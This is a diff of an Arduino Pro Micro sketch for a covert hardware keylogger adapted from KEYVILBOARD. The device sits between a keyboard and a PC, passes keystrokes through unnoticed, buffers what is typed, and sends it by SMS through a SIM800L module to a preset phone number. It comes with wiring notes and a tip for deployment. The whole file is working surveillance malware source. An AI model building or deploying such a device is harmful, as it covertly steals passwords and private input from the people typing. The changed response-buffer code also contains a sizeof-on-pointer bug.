@@ -1,7 +1,20 @@
 // Arduino Pro Micro adaptation of https://github.com/helmmen/KEYVILBOARD (originally for Teensy)
+#include <SoftwareSerial.h> // library required for serial communication using almost(!) any Digital I/O pins of Arduino
+#include "Keyboard.h" // library that contains all the HID functionality necessary pass-on the typed and logged keys to the PC
+
 /*
-    The wiring could be flexible because it relies on SoftwareSerial.
-    The wiring used with the code below is:
+    The wiring could be flexible because it relies on SoftwareSerial. But keep in mind that: 
+    "Not all pins on the Leonardo and Micro support change interrupts, so only the following 
+    can be used for RX: 8, 9, 10, 11, 14 (MISO), 15 (SCK), 16 (MOSI)". (see: https://www.arduino.cc/en/Reference/SoftwareSerial)
+    
+    The following lines are responsible for wiring:
+*/
+
+SoftwareSerial USBhost(15, 14); //communication with USB host board (receiving input from keyboard)
+SoftwareSerial Sim800L(8, 9); //communication with sim800L
+
+/*
+    The wiring used with the lines above is:
     [ Pro Micro 5V   ->  sim800L ]
                 8    ->  SIM_TXD
                 9    ->  SIM_RXD
@@ -19,17 +32,24 @@
               15    ->    TX
               14    ->    2K resistor -> RX
              RAW    ->    5V   
-             
-              3     ->    SS
-              |
-         10K resistor
-              |
-             GND
-    Possible design (pictures lack pin 3 -> SS pin connection): 
+                                                                   [This pin is not used anymore]                                                              
+                                                                   [         3     ->    SS     ]
+                                                                   [         |                  ]
+                                                                   [    10K resistor            ]
+                                                                   [         |                  ]
+                                                                   [        GND                 ]
+    Possible design: 
     https://cdn.discordapp.com/attachments/417291555146039297/417340199379533824/b.jpg
     https://cdn.discordapp.com/attachments/417291555146039297/417340239942778880/c.jpg
+    
     Make sure to read the comments below regarding sim800L baud rate. It has essential information required to make it work.
+    
+    The code sends "MODE 6" to the USB host board in order to receive raw HID data, don't worry if it changes what is received from 
+    the board (if you're using it for other projects) and just send "MODE 0" command to it by for example changing the "USBhost.println("MODE 6")" line below 
+    and running the code once.
 */
+
+
 
 /* USER BASIC + ESSENTIAL SETTINGS */
 #define PHONE_RECEIVER_NUMBER "+440000000000"
@@ -52,15 +72,8 @@
 
 /* MORE SPECIFIC SETTINGS + DEBUGGING */
 #define BAUD_RATE_SERIAL_DEBUGGING 9600
-#define DELAY_BEFORE_RELEASING_KEYS 5 // milliseconds, time between pressing and releasing the button
 #define SIM800L_RESPONSE_TIMEOUT 2000 // milliseconds 
 #define SIM800L_RESPONSE_KEEP_WAITING_AFTER_LAST_CHAR_RECEIVED 10 // milliseconds
-#define DIGITAL_PIN_KEYUP_KEYDOWN_STATE 3 // Arduino digital input pin connected to SS pin of USB host board
-#define KEY_HOLD_REPETITION_START_TIME 600
-#define KEY_HOLD_REPETITION_TIME_SEPARATION 14
-
-//#define ctrlKey KEY_LEFT_GUI //OSX
-#define ctrlKey KEY_LEFT_CTRL //Windows and Linux  (ctrlKey variation was copied from: https://www.arduino.cc/en/Reference/KeyboardPress)
 
 //#define SERIAL_DEBUG // I'd recommend  to comment it out before deploying the device, use it for testing and observing Serial Monitor only
 
@@ -91,110 +104,26 @@
   #define S_print(x)
 #endif
 
-#include "Keyboard.h" // library that contains all the HID functionality necessary pass-on the typed and logged keys to the PC
-#include <SoftwareSerial.h> // library required for serial communication using almost(!) any Digital I/O pins of Arduino 
-/*  
-    "Not all pins on the Leonardo and Micro support change interrupts, so only the following can be used for RX: 8, 9, 10, 11, 14 (MISO), 15 (SCK), 16 (MOSI)." 
-    (see: https://www.arduino.cc/en/Reference/SoftwareSerial)
-*/ 
-SoftwareSerial USBhost(15, 14); //communication with USB host board (receiving input from keyboard)
-SoftwareSerial Sim800L(8, 9); //communication with sim800L
 
 
-/*
-    "struct" below is a data structure that will allow to create an array that includes different datatypes.
-    In the further part of this sketch the code will have to know what key to press when certain byte is received from USB host shield,
-    it will also have to know what message to output to the Serial Monitor. These are 3 different values,
-    someone could create a big chunk of "else if" statements or put all the information into concise 
-    structure, loop through each item, do appropriate checks and trigger relevant actions. 
-    Instead of 3 arrays like:
-    byte bytesReceived[] = {0x49, 0x51, etc...};
-    byte keysToPress[] = {KEY_PAGE_UP, KEY_PAGE_DOWN, etc...};
-    char* keyNamesToPrint[] = {"[PgUp]", "[PgDn]", etc...};
-    We have a single struct like:   
-    EscapedKey escapedKeysData[] = {
-      0x49, KEY_PAGE_UP, "[PgUp]",
-      0x51, KEY_PAGE_DOWN, "[PgDn]",
-      etc...
-      };
-    Which can later be accessed like:
-    escapedKeysData[5].correspondingByte  // 6th element of that array (that is actually 0x53)
-    escapedKeysData[5].pressedkey         // 6th element of that array (that is actually KEY_DELETE)
-    escapedKeysData[5].loggedText         // 6th element of that array (that is actually "[Del]")
-*/
-struct EscapedKey {  
-  byte correspondingByte;
-  byte pressedKey;
-  char* loggedText;
-};
-
-EscapedKey escapedKeysData[] = {
-  0x49, KEY_PAGE_UP, "[PgUp]",
-  0x51, KEY_PAGE_DOWN, "[PgDn]",
-  0x47, KEY_HOME, "[Home]",
-  0x4F, KEY_END, "[End]",
-  0x52, KEY_INSERT, "[Ins]",
-  0x53, KEY_DELETE, "[Del]",
-  0x3B, KEY_F1, "[F1]",
-  0x3C, KEY_F2, "[F2]",
-  0x3D, KEY_F3, "[F3]",
-  0x3E, KEY_F4, "[F4]",
-  0x3F, KEY_F5, "[F5]",
-  0x40, KEY_F6, "[F6]",
-  0x41, KEY_F7, "[F7]",
-  0x42, KEY_F8, "[F8]",
-  0x43, KEY_F9, "[F9]",
-  0x44, KEY_F10, "[F10]",
-  0x57, KEY_F11, "[F11]",
-  0x58, KEY_F12, "[F12]",
-  0x48, KEY_UP_ARROW, "[Up]",
-  0x50, KEY_DOWN_ARROW, "[Down]",
-  0x4B, KEY_LEFT_ARROW, "[Left]",
-  0x4D, KEY_RIGHT_ARROW, "[Right]",
-  0x54, KEY_RIGHT_GUI, "[Print]",
-  0x5B, KEY_LEFT_GUI, "[Windows]",
-};
-
-byte altCombined_CharSymbols[] = {0x1e, 0x30, 0x2e, 0x20, 0x12, 0x21, 0x22, 0x23, 0x17, 0x24, 0x25, 0x26, 0x32, 0x31, 0x18, 0x19, 0x10, 0x13, 0x1a, 0x14, 0x16, 0x2f, 0x11, 0x2d, 0x15, 0x2c}; 
-
-EscapedKey altCombined_F_Keys[] = {
-  0x68, KEY_F1, "[ALT+F1]",   
-  0x69, KEY_F2, "[ALT+F2]",
-  0x6a, KEY_F3, "[ALT+F3]",     
-  0x6b, KEY_F4, "[ALT+F4]",
-  0x6c, KEY_F5, "[ALT+F5]",    
-  0x6d, KEY_F6, "[ALT+F6]",
-  0x6e, KEY_F7, "[ALT+F7]",    
-  0x6f, KEY_F8, "[ALT+F8]",
-  0x70, KEY_F9, "[ALT+F9]",    
-  0x71, KEY_F10, "[ALT+F10]",
-  0x8b, KEY_F11, "[ALT+F11]",    
-  0x8c, KEY_F12, "[ALT+F12]",
-  0x9, KEY_TAB, "[ALT+TAB]",
-};
-
-char flag_esc = 0; // variable changed depending on the value received from USB host board that indicates the use of "escaped character" (like Page-up, Page-down, Up-arrow, etc.) 
 char TextSms[CHAR_LIMIT+2]; // + 2 for the last confirming byte sim800L requires to either confirm (byte 26) or discard (byte 27) new sms message
 int char_count; // how many characters were "collected" since turning device on (or since last sms was sent)
-char sms_cmd[40]; // it will contain the command that will be sent to the USB host board, phone input is located at the top of the code so it's easily changable but requires an array of chars to be declared before merging the phone number with remaining part of the command
-#define SIM800L_RESPONSE_MAX_LENGTH 70
-char sim800L_response[SIM800L_RESPONSE_MAX_LENGTH];
+byte prevRawHID[8];
 
-byte lastKeyPressed;
-unsigned long lastKeyPressedTime;
-unsigned short keysCountAfterEscapedKey = 1;
-bool wasLastKeyDebounced = true;
-unsigned short keyRepetitionCount;
+//asciiMap copied from https://github.com/arduino-libraries/Keyboard/blob/master/src/Keyboard.cpp
+const PROGMEM byte asciiMap[128] = {0,0,0,0,0,0,0,0,42,43,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,158,180,160,161,162,164,52,166,167,165,174,54,45,55,56,39,30,31,32,33,34,35,36,37,38,179,51,182,46,183,184,159,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,47,49,48,163,173,53,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,175,177,176,181,0};
+const PROGMEM byte keyPadMap[16] = {85,87,0,86,99,84,98,89,90,91,92,93,94,95,96,97};
 
 
 void setup() {
   S_begin(BAUD_RATE_SERIAL_DEBUGGING); // begin serial communication with PC (so Serial Monitor could be opened and the developer could see what is actually going on in the code) 
   USBhost.begin(BAUD_RATE_USB_HOST_BOARD); // begin serial communication with USB host board in order to receive key bytes from the keyboard connected to it
+  USBhost.println("MODE 6");
   Sim800L.begin(BAUD_RATE_SIM800L); // begin serial communication with the sim800L module to let it know (later) to send an sms 
   Sim800L.println("AT+CMGF=1"); // AT+CMGF command sets the sms mode to "text" (see 113th page of https://www.elecrow.com/download/SIM800%20Series_AT%20Command%20Manual_V1.09.pdf)
   Keyboard.begin(); // start HID functionality, it will allow to type keys to the PC just as if there was no keylogger at all
   USBhost.listen(); // only 1 software serial can be listening at the time, by default the last initialized serial is listening (by using softserial.begin())
-  pinMode(DIGITAL_PIN_KEYUP_KEYDOWN_STATE, INPUT);
+  
 }
 
 void loop() {
@@ -202,169 +131,146 @@ void loop() {
   HandlingUSBhostBoard(); // function responsible for collecting, storing keystrokes from USB host board, it also is typing keystrokes to PC 
 }
 
-
-
-
 /* ------------------------------------------------------------------------------------------------------------
     USB host board stuff
+
   
- */
+*/
 
-void HandlingUSBhostBoard() { // function responsible for collecting, storing keystrokes from USB host board, it also is "passing" keystrokes to PC 
-  if (USBhost.available() > 0) { // check if any key was pressed     
-    lastKeyPressedTime = millis();
-    wasLastKeyDebounced = false;
-    byte inByte = USBhost.read(); // read the byte representing that key
-    //S_print(inByte); S_print(" - "); S_println((char)inByte);
-    if (inByte == 27){flag_esc = 1; keysCountAfterEscapedKey = 0;} // if 27 key was pressed then do nothing
-    else {
-      ApplyActionForKeyByte(inByte, flag_esc);
-      lastKeyPressed = inByte;
-      keysCountAfterEscapedKey++;
-    }
-    keyRepetitionCount = 0;
-  }
-  
-  // Line responsible for checking whether button was debounced
-  if(digitalRead(DIGITAL_PIN_KEYUP_KEYDOWN_STATE) < 1){wasLastKeyDebounced = true; keyRepetitionCount=0;}
+char hidText[27];
+byte hbc = 0; // hidText string buffer count 
+byte rawHID[8]; // modifier_bit_map, manufacturer(ignore) , key1, key2, key3, key4, key5, key6
 
-  // Lines below define what happens when button is being hold down over certain amount of time 
-  if(wasLastKeyDebounced == false) {
-    unsigned long timePassed = millis() - lastKeyPressedTime;
-    if(timePassed > KEY_HOLD_REPETITION_START_TIME && ((timePassed - KEY_HOLD_REPETITION_START_TIME) / KEY_HOLD_REPETITION_TIME_SEPARATION) > keyRepetitionCount){
-      byte last_flag_esc = 1 ? (keysCountAfterEscapedKey < 2) : 0;
-      ApplyActionForKeyByte(lastKeyPressed, last_flag_esc);
-      keyRepetitionCount++;
-    }
-  }
+void HandlingUSBhostBoard() { // function responsible for collecting, storing keystrokes from USB host board, it also is "passing" keystrokes to PC     
+  if (USBhost.available() > 0) {
+    while(USBhost.available() > 0){  //(50 > millis() - lastRec){
+      if(hbc >= sizeof(hidText)){S_println("OVERFLOW MOFOKER");}
+      
+      hidText[hbc] = USBhost.read();
+      hbc++;
+      if((hbc == 1 && hidText[hbc-1] != 10) || (hbc == 2 && hidText[hbc-1] != 13)){ // 2 bytes (10 and 13) are received before the string that includes raw HID info
+        //S_print(F("hbc_VALUE: ")); S_print(hbc); S_print(", Char: "); S_println(hidText[hbc-1]);
+        hbc--;
+      }
 
-  //If byte 27 was received alone (without any immediate following byte) then the function below will type the Esc key and print it 
-  EscKeyFix(lastKeyPressedTime);
-}
+      if(hbc == 26){
+        hidText[hbc]=0;
+        for(byte j=0; j<8; j++){
+          char buff[3] = {hidText[j*2+j+2], hidText[j*2+j+3], 0};
+          rawHID[j] = (byte)strtoul(buff, NULL, 16);
+          memset(buff,0,sizeof(buff));
+          //Serial.print("BUFF: "); Serial.print(" - "); Serial.print(rawHID[j], DEC); Serial.print(" - "); Serial.println(buff); 
+        }              
+        
+        KeyReport kr = {
+          rawHID[0], 
+          rawHID[1], {
+              rawHID[2],
+              rawHID[3],
+              rawHID[4],
+              rawHID[5],
+              rawHID[6],
+              rawHID[7],
+            }};
+                  
+        HID().SendReport(2, &kr, sizeof(KeyReport));
 
-void EscKeyFix(unsigned long lastKeyPressedTime){
-  if(flag_esc == 1){
-    if(millis() - lastKeyPressedTime > 50){
-      flag_esc = 0;
-      S_println(F("[Esc]"));
-      Keyboard.press(KEY_ESC);
-      delay(DELAY_BEFORE_RELEASING_KEYS);
-      Keyboard.releaseAll();    
-      keysCountAfterEscapedKey = 1;
-    }
-  }
-}
-
-void ApplyActionForKeyByte(byte inByte, byte flag_state){
-  if (flag_state == 1) {
-    // Previous char was ESC - Decode all the escaped keys
-    PressEscapedKey(inByte); // prints but doesn't type
-    flag_esc = 0;
-  }
-  else {
-    S_print(inByte); S_print(" - "); S_println((char)inByte); // debug line
-    
-    if ((inByte >= 1 && inByte <= 26) && (inByte < 8 || inByte > 10) && inByte != 13) { // for all of the Control+someChar
-      // >= stands for "higher or equal"
-      // && stands for "and"
-      // || stands for "or"
-      S_print(F("Control+"));
-      S_println((char)(inByte + 96)); // 1 for a + 96 gives 97 which is ascii value for it, the same happens for all the other characters from a to z
-      Keyboard.press(ctrlKey);
-      Keyboard.press((char)(inByte + 96));
-      delay(DELAY_BEFORE_RELEASING_KEYS);
-      Keyboard.releaseAll();
-    }
-    else if (inByte == 8) {
-      S_println(F("Backspace"));
-      char_count--; //This is for that backspaced stuff is non important in the array
-      if(char_count < 0){char_count = 0;} // otherwise index could be negative if backspace was repeatedly pressed
-      Keyboard.press(KEY_BACKSPACE);
-      delay(DELAY_BEFORE_RELEASING_KEYS);
-      Keyboard.releaseAll();
-    }
-    else if (inByte == 9) {
-      S_println(F("^T"));
-      TextSms[char_count] = '^';
-      char_count++;
-      if(char_count > CHAR_LIMIT - 3){S_println(F("Warning: TAB (2 bytes) could overwrite 1 of the last characters..."));}
-      TextSms[char_count] = 'T';
-      Keyboard.press(KEY_TAB);
-      delay(DELAY_BEFORE_RELEASING_KEYS);
-      Keyboard.releaseAll();
-    }
-    //10 is just left
-    else if (inByte == 13) {
-      S_println(F("Enter"));
-      Keyboard.press((char)inByte);
-      delay(DELAY_BEFORE_RELEASING_KEYS);
-      Keyboard.releaseAll();
-    }
-    else {
-      TextSms[char_count] = (char)inByte;
-      char_count++;
-      Keyboard.press((char)inByte);
-      delay(DELAY_BEFORE_RELEASING_KEYS);
-      Keyboard.releaseAll();
+        if(WasKeyPressed(prevRawHID,rawHID)){
+           byte key = GetKeyPressed(prevRawHID, rawHID);
+           if(key){
+            S_print("\nChars: "); S_println(hidText);
+            S_print("Key: "); S_println(key);
+            byte asciiKey = HID_to_ASCII(key, WasShiftDown(rawHID[0]));
+            
+            if(asciiKey){
+              //finally add it to the TextSms
+              //Serial.print("SAVING: "); Serial.print(asciiKey); Serial.print(" - "); Serial.println((char)asciiKey);
+              TextSms[char_count] = (char)asciiKey;
+              char_count++;
+              if(char_count == sizeof(TextSms)){char_count=0;}
+              //Serial.print("CHAR_COUNT: "); Serial.println(char_count);
+            }
+            asciiKey = 0;
+          }
+          key = 0; 
+        }
+        else{ // was released
+          //S_println(F("RELEASED"));
+        }               
+        strncpy(prevRawHID, rawHID, sizeof(rawHID));
+        //for(byte j=0; j<sizeof(rawHID); j++){prevRawHID[j] = rawHID[j];}
+        memset(rawHID,0,sizeof(rawHID));
+        memset(hidText,0,sizeof(hidText));
+        hbc = 0;
+        break;
+      }     
     }
   }
 }
 
-void PressEscapedKey(byte inByte){
-  /*
-      Loop for page up, page down, etc. (http://www.hobbytronics.co.uk/usb-host-keyboard)
-      "Special 2-character key combinations
-      First Character is Escape (27 [0x1B]) followed by..."
-  */
-  for (byte i = 0; i < sizeof(escapedKeysData) / sizeof(EscapedKey); i++) {
-    if (inByte == escapedKeysData[i].correspondingByte) {
-      S_println(escapedKeysData[i].loggedText);
-      Keyboard.press(escapedKeysData[i].pressedKey);
-      delay(DELAY_BEFORE_RELEASING_KEYS);
-      Keyboard.releaseAll();
-      return;
+byte HID_to_ASCII(byte key, bool shiftDown){
+  for(byte i=0; i<128; i++){
+    byte b = pgm_read_byte(asciiMap + i);
+    if(!(shiftDown == false && b >= 128) && !(shiftDown == true && b < 128)){
+      if(key == (shiftDown ? b ^ 128 : b)){
+        return i;
+      }
     }
   }
 
-  // Loop for alt combined a-z keys (http://www.hobbytronics.co.uk/download/usb_host_keyboard_codes.txt)
-  for (byte i = 0; i < sizeof(altCombined_CharSymbols); i++) {
-    if (inByte == altCombined_CharSymbols[i]){
-      S_print(F("Alt+"));
-      S_println((char)(i + 97)); // 0+97 for a gives 97 which is ascii value for it, the same happens for all the other characters from a to z
-      Keyboard.press(KEY_LEFT_ALT);
-      Keyboard.press((char)(i + 97));
-      delay(DELAY_BEFORE_RELEASING_KEYS);
-      Keyboard.releaseAll();
-      return;
+  // numpad keys
+  for(byte i=0; i < 16; i++){
+    if(key == pgm_read_byte(keyPadMap + i)) {
+      return i+42;
     }
   }
-
-  // Loop for alt combined F1-F12 keys (http://www.hobbytronics.co.uk/download/usb_host_keyboard_codes.txt)
-  for (byte i = 0; i < sizeof(altCombined_F_Keys) / sizeof(EscapedKey); i++) {
-    if (inByte == altCombined_F_Keys[i].correspondingByte) {
-      S_println(altCombined_F_Keys[i].loggedText);
-      Keyboard.press(KEY_LEFT_ALT);
-      Keyboard.press(altCombined_F_Keys[i].pressedKey);
-      delay(DELAY_BEFORE_RELEASING_KEYS);
-      Keyboard.releaseAll();
-      return;
-    }
-  }
-
-  S_print(F("[?]"));
+  return 0; 
 }
+
+
+bool WasKeyPressed(byte* prevRawHID, byte* rawHID){
+  for(int i=2; i<8; i++){
+    if(rawHID[i] == 0){return false;}
+    if(prevRawHID[i] == 0){return true;}   
+  }
+  return false;
+}
+
+byte GetKeyPressed(byte* prevRawHID, byte* rawHID){
+  for(int i=2; i<8; i++){
+    if(rawHID[i] > 0 && prevRawHID[i] == 0){return rawHID[i];} 
+  }
+  return 0;
+}
+
+bool WasShiftDown(byte modByte){
+  return (IsBitHigh(modByte, 1) || IsBitHigh(modByte, 5)); //if 2nd or 6th bit (left/right shift)
+}
+
+// thanks to Marc Gravell's https://stackoverflow.com/questions/9804866/return-a-specific-bit-as-boolean-from-a-byte-value
+bool IsBitHigh(byte byteToConvert, byte bitToReturn){
+  byte mask = 1 << bitToReturn;
+  return (byteToConvert & mask) == mask;
+}
+
+
+      
+
+
 
 
 
 
 /* ------------------------------------------------------------------------------------------------------------
     sim800L stuff
+
   
  */
 
 void HandlingSim800L() { 
-  if (char_count == CHAR_LIMIT - 1) { // -1 is there because KEY_TAB takes 2 characters to write and if it would be the last pressed key it would write over the range of the array
+  if (char_count == CHAR_LIMIT - 1) {
     unsigned long functionEntryTime = millis();
+    char sms_cmd[40];
     
     Sim800L.listen();
     S_println(F("\nSMS with the following content is about to be sent to sim800L: ")); S_println(TextSms);
@@ -378,6 +284,7 @@ void HandlingSim800L() {
     USBhost.listen();
 
     S_print(F("Sending SMS took: ")); S_print(millis() - functionEntryTime); S_println("ms.");
+    memset(sms_cmd, 0, sizeof(sms_cmd));
   } 
 }
 
@@ -385,21 +292,23 @@ void Send_Sim800L_Cmd(char* cmd, char* desiredResponsePart){
   Sim800L.write(cmd);
   S_println(F("\nThe following command has been sent to sim800L: ")); S_println(cmd);
   S_println(F("Waiting for response..."));
-  
-  if(!Get_Sim800L_Response(sim800L_response, cmd, SIM800L_RESPONSE_TIMEOUT, SIM800L_RESPONSE_KEEP_WAITING_AFTER_LAST_CHAR_RECEIVED)){
+
+  char response[40];
+  if(!Get_Sim800L_Response(response, cmd, SIM800L_RESPONSE_TIMEOUT, SIM800L_RESPONSE_KEEP_WAITING_AFTER_LAST_CHAR_RECEIVED)){
     S_print(F("WARNING: No response received within ")); S_print(SIM800L_RESPONSE_TIMEOUT); S_println("ms.)");
   }
   else{
-    if(!strstr(sim800L_response, desiredResponsePart)){ 
+    if(!strstr(response, desiredResponsePart)){ 
       S_println(F("WARNING: Response did not include desired characters.")); 
     }
-    S_println(F("Response: ")); S_println(sim800L_response);
+    S_println(F("Response: ")); S_println(response);
   }
+  memset(response, 0, sizeof(response));
 }
 
 // eg. if(Get_Sim800L_Response(sim800L_response, cmd, 1000, 10);){}
 bool Get_Sim800L_Response(char* response, char* lastCmd,  unsigned short timeout, unsigned short keepCheckingFor) { // timeout = waitForTheFirstByteForThatLongUntilReturningFalse, keepCheckingFor = checkingTimeLimitAfterLastCharWasReceived
-  for(byte i=0; i<SIM800L_RESPONSE_MAX_LENGTH; i++){response[i]=0;}  //clear buffer
+  for(byte i=0; i < sizeof(response); i++){response[i]=0;}  //clear buffer
   
   unsigned long functionEntryTime = millis();
   while(Sim800L.available() <= 0){
@@ -414,7 +323,7 @@ bool Get_Sim800L_Response(char* response, char* lastCmd,  unsigned short timeout
   unsigned long lastByteRec = millis(); // timing functions (needed for reliable reading of the BTserial)
   while (keepCheckingFor > millis() - lastByteRec) // if no further character was received during 10ms then proceed with the amount of chars that were already received (notice that "previousByteRec" gets updated only if a new char is received)
   {         
-    while (Sim800L.available() > 0 && i < SIM800L_RESPONSE_MAX_LENGTH-1) {
+    while (Sim800L.available() > 0 && i < sizeof(response)-1) {
       if(i == strlen(lastCmd)){
         if(!strncmp(response, lastCmd, strlen(response)-1)){
           ignorePreviouslyTypedCommand = i+1;
@@ -428,7 +337,7 @@ bool Get_Sim800L_Response(char* response, char* lastCmd,  unsigned short timeout
       i++;
       lastByteRec = millis();
     }    
-    if(i >= SIM800L_RESPONSE_MAX_LENGTH-1){return true;}
+    if(i >= sizeof(response)-1){return true;}
   }
   return true;
 }
